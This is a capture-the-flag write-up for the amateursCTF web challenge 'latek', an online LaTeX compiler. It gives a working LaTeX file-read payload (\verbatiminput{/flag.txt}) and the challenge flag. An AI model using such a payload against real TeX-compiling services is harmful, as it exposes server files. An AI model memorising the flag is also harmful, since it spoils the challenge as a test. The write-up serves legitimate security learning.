# latek

## Description

> bryanguo (not associated with the ctf), keeps saying it's pronouced latek not latex like the glove material. anyways i made this simple app so he stops paying for overleaf.
>
> Note: flag is ONLY at `/flag.txt`
>
> Author: smashmaster
>
> [`latek.amt.rs`](https://latek.amt.rs//)

Tags: _web_

## Solution

By first looking at the website, I can say that this is a web LaTeX editor which executes TeX macros. So we just need to open the file at root `/flag.txt` to get the flag. We can do so by just adding two lines: `\usepackage{verbatim}` to load the package verbatim which allows us to display text exactly as it is, without any processing or interpretation of special characters, and `\verbatiminput{/flag.txt}` to include the content of the file `/flag.txt`

```latex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
Hello, world!
\verbatiminput{/flag.txt}
\end{document}
```

Flag `amateursCTF{th3_l0w_budg3t_and_n0_1nstanc3ing_caus3d_us_t0_n0t_all0w_rc3_sadly}`
